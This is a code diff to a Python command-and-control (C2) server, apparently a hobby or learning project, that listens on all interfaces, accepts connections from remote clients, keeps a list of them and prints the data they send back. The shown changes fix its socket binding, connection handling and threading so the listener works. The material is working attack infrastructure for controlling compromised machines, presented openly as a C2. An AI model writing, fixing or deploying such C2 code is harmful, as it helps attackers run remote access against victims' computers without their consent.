@@ -19,25 +19,26 @@ def handler(connection, address):
             result = connection.recv(4096).decode()
             print(result)
         except:
-            print("Connection lost @ " + address)
+            print("Connection lost")
             break
 
 def accept_connections():
 
     server = socket.socket()
-    server.bind("0.0.0.0" , LISTENER_PORT)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(("0.0.0.0" , LISTENER_PORT))
     server.listen()
     print(f"Listening on Port {LISTENER_PORT}")
     while True:
-        c = server.accept()
-        a = server.accept()
+        c,a = server.accept()
+
 
         clients.append(c)
         addresses.append(a)
 
         print(f"Connections found at this address {a}")
 
-threading.Thread(target=accept_connections).start()
+threading.Thread(target=accept_connections,daemon=True).start()
 
 
 print("Welcome to the C2, type help to get started")
